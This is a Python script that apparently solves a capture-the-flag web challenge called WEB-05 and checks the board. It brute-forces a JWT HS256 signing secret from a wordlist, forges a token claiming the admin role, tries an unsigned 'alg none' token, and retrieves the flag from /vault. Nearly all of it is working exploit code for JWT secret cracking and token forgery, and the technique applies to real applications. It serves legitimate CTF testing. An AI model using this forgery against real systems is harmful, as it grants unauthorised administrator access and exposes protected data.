#!/usr/bin/env python3
"""WEB-05 Weak JWT: log in as guest, brute-force the HS256 secret against
/wordlist.txt, forge {"role":"admin"} and open /vault. Also checks that the
board rejects alg "none"."""
import base64
import hashlib
import hmac
import json

import requests

import _util as u


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def unb64u(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def sign(secret: str, signing_input: str) -> str:
    return b64u(hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest())


def main():
    a = u.args(__doc__)
    r = requests.post(u.url(a, "/login"), data={"user": "guest"}, timeout=10)
    token = r.cookies.get("session")
    h, p, sig = token.split(".")
    print("guest token:", token)
    print("header:", unb64u(h).decode(), "payload:", unb64u(p).decode())

    words = requests.get(u.url(a, "/wordlist.txt"), timeout=20).text.split()
    print(f"wordlist: {len(words)} words")
    secret = next((w for w in words if sign(w, f"{h}.{p}") == sig), None)
    if secret is None:
        raise SystemExit("WEB-05: secret not in wordlist")
    print("secret:", secret)

    claims = json.loads(unb64u(p))
    claims["role"] = "admin"
    p2 = b64u(json.dumps(claims, separators=(",", ":")).encode())
    forged = f"{h}.{p2}.{sign(secret, f'{h}.{p2}')}"

    none_h = b64u(b'{"alg":"none","typ":"JWT"}')
    r = requests.get(u.url(a, "/vault"), headers={"Authorization": f"Bearer {none_h}.{p2}."},
                     timeout=10)
    print(f"alg none: HTTP {r.status_code}")
    if r.status_code == 200:
        raise SystemExit("WEB-05: board accepted alg none")

    r = requests.get(u.url(a, "/vault"), headers={"Authorization": f"Bearer {forged}"}, timeout=10)
    print(f"forged admin: HTTP {r.status_code}")
    m = u.FLAG_RE.search(r.text)
    u.finish("WEB-05", m.group(0) if m else None, a)


main()
